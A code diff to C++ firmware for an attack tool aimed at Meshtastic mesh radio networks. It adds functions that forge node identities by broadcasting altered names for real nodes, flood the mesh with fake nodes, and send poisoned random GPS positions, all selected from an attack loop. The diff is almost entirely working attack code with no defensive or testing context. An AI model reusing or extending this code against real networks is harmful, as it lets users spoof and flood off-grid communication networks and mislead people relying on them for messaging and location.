@@ -19,7 +19,7 @@ uint32_t TMAttack::getRandomTarget() {
     return srcnode;
 }
 
-void TMAttack::rndPos() {
+void TMAttack::atkRndPos() {
     // Generate random latitude and longitude within specified bounds
     double latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
     double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
@@ -46,6 +46,63 @@ void TMAttack::rndPos() {
     meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
 }
 
+void TMAttack::atkNameChange() {
+    // Generate random latitude and longitude within specified bounds
+    uint32_t srcnode = target;   // todo randomize based on node db
+    if (target == 0xffffffff) {  // if target is everybody, randomize srcnode
+        srcnode = getRandomTarget();
+        if (srcnode == 0) {
+            return;  // no valid target found
+        }
+    }
+    auto node = meshtasticCompact->nodeinfo_db.get(srcnode);
+    if (!node) {
+        return;  // no valid target found
+    }
+    std::string new_name = node->long_name;
+    if (emoji.length() <= 0) {
+        emoji = "😈";
+    }
+    if (emoji.length() > 30) {
+        emoji = emoji.substr(0, 30);  // limit to 30 bytes
+    }
+    if (new_name.length() + emoji.length() > 38) {
+        new_name = new_name.substr(0, 38 - emoji.length());
+    }
+    new_name += emoji;
+    strncpy(node->long_name, new_name.c_str(), 39);
+    node->long_name[39] = '\0';
+    meshtasticCompact->SendNodeInfo(*node, 0xffffffff, false);
+}
+
+void TMAttack::atkRndNode() {
+    // Generate random latitude and longitude within specified bounds
+    double latitude = min_lat + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lat - min_lat)));
+    double longitude = min_lon + static_cast<double>(rand()) / (static_cast<double>(RAND_MAX / (max_lon - min_lon)));
+
+    // Create and send the fake position message
+    MC_Position pos_msg = {};
+    pos_msg.latitude_i = static_cast<int32_t>(latitude * 1e7);
+    pos_msg.longitude_i = static_cast<int32_t>(longitude * 1e7);
+    pos_msg.altitude = esp_random() % 1000;  // Random altitude
+    pos_msg.ground_speed = 0;
+    pos_msg.sats_in_view = 0;
+    pos_msg.location_source = 1;
+    pos_msg.has_latitude_i = true;
+    pos_msg.has_longitude_i = true;
+    pos_msg.has_altitude = true;
+    pos_msg.has_ground_speed = true;
+    uint32_t srcnode = target;
+    if (target == 0xffffffff) {
+        srcnode = esp_random();
+    }
+    MC_NodeInfo nodeinfo = {};
+    std::string none = "";
+    MeshtasticCompactHelpers::NodeInfoBuilder(&nodeinfo, srcnode, none, none, esp_random() % 105);
+    meshtasticCompact->SendNodeInfo(nodeinfo, 0xffffffff, false);
+    meshtasticCompact->SendPositionMessage(pos_msg, 0xffffffff, 8, srcnode);
+}
+
 void TMAttack::loop() {
     if (meshtasticCompact == nullptr) {
         return;  // Radio not set
@@ -59,6 +116,10 @@ void TMAttack::loop() {
     }
     timer = 0;
     if (current_attack == AttackType::POS_POISON) {
-        rndPos();
+        atkRndPos();
+    } else if (current_attack == AttackType::NODE_FLOOD) {
+        atkRndNode();
+    } else if (current_attack == AttackType::NAME_CHANGE) {
+        atkNameChange();
     }
 }
